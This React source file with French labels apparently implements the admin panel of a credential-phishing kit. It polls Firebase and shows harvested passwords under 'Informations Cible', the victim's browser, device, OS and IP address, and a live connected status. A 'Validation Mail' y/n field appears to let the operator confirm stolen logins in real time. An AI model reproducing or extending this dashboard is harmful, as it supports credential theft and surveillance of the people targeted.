import React, { Fragment, useContext, useState, useEffect } from 'react'
import App from './App';
import { Paper, Grid, Typography,TextField,Button } from '@material-ui/core';
import List from '@material-ui/core/List';
import ListItem from '@material-ui/core/ListItem';
import ListItemIcon from '@material-ui/core/ListItemIcon';
import ListItemText from '@material-ui/core/ListItemText';
import LockOpenIcon from '@material-ui/icons/LockOpen';
import { FirebaseContext } from '../Firebase'
import CircularProgress from '@material-ui/core/CircularProgress';

import LanguageIcon from '@material-ui/icons/Language';
import SettingsIcon from '@material-ui/icons/Settings';
import PhoneAndroidIcon from '@material-ui/icons/PhoneAndroid';
import RouterIcon from '@material-ui/icons/Router';




const Admin = () => {
 
  const firebase = useContext(FirebaseContext)
  const [informations, setInformations] = useState([])
  const [answer, setAnswer] = useState('')
  const [status, setStatus] = useState([])
  const [system, setSystem] = useState([])
  const icon = [
    <LanguageIcon />,
    <PhoneAndroidIcon />,
    <SettingsIcon />,
    <RouterIcon />
  ]







  useEffect(() => {
    getMdp()
    getStat()
    
  }, [])

  const handleAnwer = e=>{
    setAnswer(e.target.value)
  }

  const handleSubmit = (e)=>{
    e.preventDefault()
    firebase.addValidation(answer)
    .then( succ=>{
      alert("added succefful")
      console.log("validation added succeful")
    })
    .catch( err=>{
      console.log(err)
    })
    console.log(answer)
  }
  const getMdp = () => {

    firebase.getPassword()
      .then((collection) => {
        if (collection) {
          let tabTemp = []
          collection.docs.map(doc => tabTemp.push(doc.data()))
          if (informations.length !== tabTemp.length) {
            setInformations(tabTemp)
            
          }


        } else {
          console.log("une erreur est survenu")
        }
      })

  }

  const getSys = () => {

    firebase.getInfoSystem()
      .then((collection) => {
        if (collection) {
          let tabTemp = []
          collection.docs.map(doc => tabTemp.push(doc.data()))
          if (informations.length !== tabTemp.length) {
            setSystem(tabTemp)
          }
       

        } else {
          console.log("une erreur est survenu")
        }
      })
      console.log("get password")

  }




  const getStat = () => {

    firebase.getStatus()
      .then((collection) => {
        if (collection) {
          let tabTemp = []
          collection.docs.map(doc => tabTemp.push(doc.data()))

          if (status.length == 0) {
            setStatus(tabTemp)
          }



        } else {
          console.log("une erreur est survenu")
          setStatus([])
        }
      })
  }



  setInterval(() => {
    getMdp()
    getStat()
    getSys()
  }, 5000);


  const showStatus = status.length == 0 ? (
    <Paper style={{ height: '200px' }}>
      <Grid
        container
        direction="row"
        justify="center"
        alignItems="center"

      >
        <Grid style={{ width: '100px', height: '100px', border: '2px solid black', borderRadius: '100%', margin: '20px 0', background: '#e63946' }}>

          {/* connected: 02c39a */}
          {/* deconnected: e63946 */}
        </Grid>
        <Grid style={{ margin: '20px' }} color='secondary'>    User déconnecté</Grid>
      </Grid>
    </Paper>
  )
    :
    (
      <Paper style={{ height: '200px' }}>
        <Grid
          container
          direction="row"
          justify="center"
          alignItems="center"

        >
          <Grid style={{ width: '100px', height: '100px', border: '2px solid black', borderRadius: '100%', margin: '20px 0', background: '#02c39a' }}>

            {/* connected: 02c39a */}
            {/* deconnected: e63946 */}
          </Grid>
          <Grid style={{ margin: '20px' }} color="secondary">   User Connecté</Grid>
        </Grid>
      </Paper>
    )

  const listPass = informations.length !== 0 ? (informations.map((val, index) => (
    <ListItem button key={index}>
      <ListItemIcon>
        <LockOpenIcon />
      </ListItemIcon>
      <ListItemText primary={val.password} />
    </ListItem>
  ))) : (
      <ListItem button >
        <ListItemIcon>
          <LockOpenIcon />
        </ListItemIcon>
        <ListItemText primary="unavailable" />
      </ListItem>
    )



const  sys = system.length !== 0 ? system[0] : []

const listSystem = sys.length !== 0 ? (
  
  <Fragment>

<ListItem button >
    <ListItemIcon>
    <LanguageIcon />
    </ListItemIcon>
    <ListItemText primary={sys.browser} />
  </ListItem>

<ListItem button >
<ListItemIcon>
<PhoneAndroidIcon />
</ListItemIcon>
<ListItemText primary={sys.device} />
</ListItem>

<ListItem button >
    <ListItemIcon>
    <SettingsIcon />
    </ListItemIcon>
    <ListItemText primary={sys.os} />
  </ListItem>

<ListItem button >
<ListItemIcon>
<RouterIcon />
</ListItemIcon>
<ListItemText primary={sys.ip} />
</ListItem>
  </Fragment>
) : (
    <ListItem button >
      <ListItemIcon>
        <LockOpenIcon />
      </ListItemIcon>
      <ListItemText primary="unavailable" />
    </ListItem>
  )

  const showBtnValidate = answer == '' ? (
    <Button
    variant="contained"
    color="primary"
    type="submit"
    disabled
    >
    VALIDATE
    </Button>
  )
  :
  (
    <Button
    variant="contained"
    color="primary"
    type="submit"
    >
    VALIDATE
    </Button>
  )
  return (
    <Fragment>
      <App />
      <Grid
        container
        direction="row"
        //justify="center"
        alignItems="center"
        spacing={1}
        style={{ marginTop: '20px' }}
      >

        <Grid item xs={12} md={4} style={{ background: '#1d3557', color: "white", fontWeight: '900' }}>
          <Grid style={{ height: '50px', textAlign: 'center', paddingTop: '3%' }} >
            Informations Cible
          </Grid>
          <Paper style={{ height: '200px' }}>
            <List component="nav" aria-label="contacts">

              {listPass}

            </List>
          </Paper>
        </Grid>
        <Grid item xs={12} md={4} style={{ background: '#1d3557', color: "white", fontWeight: '900' }}>
          <Grid style={{ height: '50px', textAlign: 'center', paddingTop: '3%' }} >
            Informations System
          </Grid>
          <Paper style={{ height: '200px' }}>
            <List component="nav" aria-label="contacts">

              {listSystem}

            </List>
          </Paper>
        </Grid>
        <Grid item xs={12} md={4} style={{ background: '#1d3557', color: "white", ontWeight: '900' }} >
          <Grid style={{ background: '#1d3557', color: "white", height: '50px', textAlign: 'center', paddingTop: '3%', fontWeight: '900' }} >Status</Grid>

          {showStatus}

        </Grid>
        <Grid item xs={12} md={4} style={{ background: '#1d3557', color: "white", ontWeight: '900' }} >
          <Grid style={{ background: '#1d3557', color: "white", height: '50px', textAlign: 'center', paddingTop: '3%', fontWeight: '900' }} >Validation Mail</Grid>

         



          <Paper style={{ height: '200px' }}>
      <Grid
        container
        direction="row"
      
        alignItems="center"

      >
        <Grid item md={12} xs={12} style={{ width: '100px', height: '100px',  margin: '20px 0',padding: '0 30px' }}>

        

        
          <form noValidate autoComplete="off" onSubmit={handleSubmit}>
              <TextField
              id="validation"
              label="validate(y/n)"
              variant="outlined"
              style={{width: '100%',marginBottom: '20px'}}
              value={answer}
              onChange={handleAnwer}
              >

              </TextField>
             {showBtnValidate}
          </form>
      
        </Grid>
      
      </Grid>
    </Paper>







        </Grid>
      </Grid>
    </Fragment>
  )
}


export default React.memo(Admin)   